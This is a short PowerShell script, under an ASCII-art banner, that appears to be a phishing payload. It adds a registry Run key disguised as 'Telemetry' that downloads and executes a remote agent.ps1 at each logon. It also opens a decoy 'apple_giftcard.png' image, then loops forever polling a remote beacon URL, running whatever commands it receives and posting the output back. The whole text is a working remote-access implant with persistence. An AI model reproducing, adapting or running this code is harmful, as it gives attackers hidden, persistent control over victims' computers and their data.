# # # # # # # # # # # # # # # # # # # # # # # # #
#                                               #  
#                                               #  
# /     \             \            /    \       #
#|       |             \          |      |      #
#|       `.             |         |       :     #
#`        |             |        \|       |     #
# \       | /       /  \\\   --__ \\       :    #
#  \      \/   _--~~          ~--__| \     |    #  
#   \      \_-~                    ~-_\    |    #
#    \_     \        _.--------.______\|   |    #
#      \     \______// _ ___ _ (_(__>  \   |    #
#       \   .  # ___)  ______ (_(____>  |  /    #
#       /\ |   # ____)/      \ (_____>  |_/     #
#      / /\|   #_____)       |  (___>   /  \    #
#     |   (   _#_____)\______/  // _/ /     \   #
#     |    \  |__   \\_________// (__/       |  #
#    | \    \____)   `----   --'             |  #
#    |  \_          ___\       /_          _/ | #
#   |              /    |     |  \            | #
#   |             |    /       \  \           | #
#   |          / /    |         |  \           |#
#   |         / /      \__/\___/    |          |#
#  |           /        |    |       |         |#
#  |          |         |    |       |         |#
# # # # # # # # # # # # # # # # # # # # # # # # #















$beacon = 'http://capablanca.pythonanywhere.com/cmd';
$result = 'http://capablanca.pythonanywhere.com/rsp';

Set-Variable ProgressPreference SilentlyContinue
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Telemetry" -Value "powershell.exe -command `"iex [System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest 'http://solem.dev/phishbait/agent.ps1').Content)`""
Set-Content ($env:USERPROFILE+"\AppData\Local\Temp\apple_giftcard.png") -Value ((Invoke-WebRequest 'http://solem.dev/phishbait/apple_giftcard.png').Content) -Encoding Byte
Start-Sleep -Seconds 2;
Invoke-Item ($env:USERPROFILE+"\AppData\Local\Temp\apple_giftcard.png")
while ($true){
    $command = (Invoke-WebRequest $beacon).Content;
    if($command -ne ""){
        $out = @(Invoke-Expression $command);
        Invoke-WebRequest -Uri ($result) -Method POST -Body ("data="+$out);
        
    }
    Start-Sleep -Seconds 10;
}
